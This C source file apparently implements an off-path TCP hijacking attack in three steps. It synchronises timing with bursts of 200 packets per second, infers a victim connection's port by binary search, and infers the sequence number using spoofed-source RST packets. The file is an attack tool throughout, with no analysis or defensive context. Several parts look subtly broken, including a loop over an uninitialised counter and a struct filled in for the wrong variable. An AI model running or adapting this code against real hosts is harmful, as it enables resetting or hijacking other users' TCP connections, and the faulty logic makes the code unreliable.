#include "Util.h"

/*  step1:
    1.sychronize the time with client 
    send 200 packets in 1s
    2.check the returned packets and 
    check out the relationship between n1, n2*/
long timeSync(int packetCount, const char* src_ip, int src_port, 
    const char* dst_ip, int dst_port, const char* data){
    struct reVal val1;
    long t1 = getTime();
    round12(packetCount, src_ip, src_port,
        dst_ip, dst_port, data, &val1);
    if(val1.packetCount == 200){
        printf("time sychronized\n");
        return t1;
    }else{

        /* second round probing*/
        long tempt, interval;
        struct reVal val2;
        val2.packetCount=0; val2.x=0; val2.y=0;
        do{
            tempt = getTime();
            interval = tempt - t1;
            if(interval % 1000 != 0)
                continue;
            else
                break;
        }while(1);
        //shift 5ms
        usleep(5000);
        round12(packetCount, src_ip, src_port,
            dst_ip, dst_port, data, &val2);

        if(val2.packetCount == 200){
            printf("time sychronized\n");
            return tempt + 5;
        }
        /*=======end===========*/
        else{
            /* starting round 3*/
            if(val2.packetCount >= val1.packetCount){
                return (300 - val2.packetCount) * 5;
            }else{
                return (val2.packetCount - 100) * 5;
            }
            /*=====end=========*/
        }
    }
    return 1;
}

/* step 2:
    port inference using binary search*/
int bs4port(int left, int right, const char* src_ip, 
                 const char* dst_ip, const char* data, long timeSync){
    int templ = left, tempr = right;
    int middle;
    while(templ < tempr){
        middle = (templ + tempr) / 2;
         /* create thread to listen port*/
        pthread_t ntid;
        struct message msg;
        strcpy(msg.src_ip, src_ip);
        struct reVal val;
        msg.src_port = templ;
        int err = pthread_create(&ntid, NULL, recvPackets, (void*)&msg);
        if(err != 0)
            err_exit("create thread error");
        
        /*========end===================*/
        int i;
        for(middle; i<right; i++){
            tcp_ip_send(src_ip, i, dst_ip, i, data, SYN, 0, 0, 29200);
        }
        
        sendPackets(timeSync, 100, src_ip, templ, dst_ip, tempr, data, RST, 0, 0, 29200);
        pthread_join(ntid, (void*)&val);
        if(val.packetCount == 100)
            tempr = middle - 1;
        else
            templ = middle;
    }
    return templ;
}


/* 3.step 3 sequence number inference*/
int seqInference(int n, int first_seq, const char* spoofed_ip, int s_port, 
                 const char* dst_ip, int dst_port, const char* normal_ip, 
                 int n_port, const char* data, long timeSync){
    int adjustN = n;
    /* step 1 send n packets in 1s*/
    int space = 61000 - first_seq;
    int packetCount = space / n;

    /* create thread to send packets */
    pthread_t ntid1;
    struct spoofedStruct nonSpoofedStruct;
    strcpy(nonSpoofedStruct.src_ip, normal_ip);
    nonSpoofedStruct.src_port = n_port;
    strcpy(nonSpoofedStruct.dst_ip, dst_ip);
    nonSpoofedStruct.dst_port = dst_port;
    strcpy(nonSpoofedStruct.data, data);
    nonSpoofedStruct.seq = first_seq;
    nonSpoofedStruct.timeSync = timeSync;

    int err2 = pthread_create(&ntid1, NULL, nonSpoofed, (void*)&nonSpoofedStruct);
    if(err2 != 0)
        err_exit("create thread error");
    /*============end===============*/

    /* create thread to listen incoming packets*/
    pthread_t ntid2;
    struct message msg;
    strcpy(msg.src_ip, normal_ip);
    struct reVal val;
    msg.src_port = n_port;
    int err = pthread_create(&ntid2, NULL, recvPackets, (void*)&msg);
    if(err != 0)
        err_exit("create thread error");
    sendPackets(timeSync, 100, normal_ip, n_port, dst_ip, dst_port, data, RST, 0, 0, 29200);
    
    /*==================end====================*/

    sendPackets(timeSync, packetCount, spoofed_ip, s_port, dst_ip, dst_port, 
                data, RST, first_seq, first_seq, 12600);
    pthread_join(ntid1, NULL);
    pthread_join(ntid2, (void*)&val);
    int divide = space / n * (100 - val.packetCount);
    // space would be that range
    /*=============end step1========*/

    /* step 2 identify the correct sequence block*/
    int blocks = space / divide;
    int blocksCount = blocks / 100 + 1;
    int i, choose=0;
    struct reVal val2;
    while(blocksCount >0){
        for(i=0; i<blocksCount; i++){
        sendPackets(timeSync, packetCount, spoofed_ip, s_port, dst_ip, dst_port, 
                data, RST, first_seq, first_seq + (i+choose*100) * divide, 12600);
        }
        /* create thread to listen incoming packets*/
        pthread_t ntid3;
        struct message msg2;
        strcpy(msg.src_ip, normal_ip);
        
        msg2.src_port = n_port;
        int err = pthread_create(&ntid3, NULL, recvPackets, (void*)&msg2);
        if(err != 0)
            err_exit("create thread error");
        pthread_join(ntid3, (void*)&val2);
        /*==================end thread=============*/
        blocksCount--;
        choose++;
    }
    
    int blockChoose = 100 * choose + val2.packetCount;
    /*=================end step 2================*/

    /* step 3: find the correct ack value, aka. nxt
        using binary search*/
    int left = first_seq + blockChoose * divide;
    int right = left + divide;

    /*==================end step3==================*/
    int seq = binSearch(left, right, spoofed_ip, s_port, dst_ip, 
                        dst_port, normal_ip, dst_port, data, timeSync);
    return seq;
    
}
/*===============end=================*/



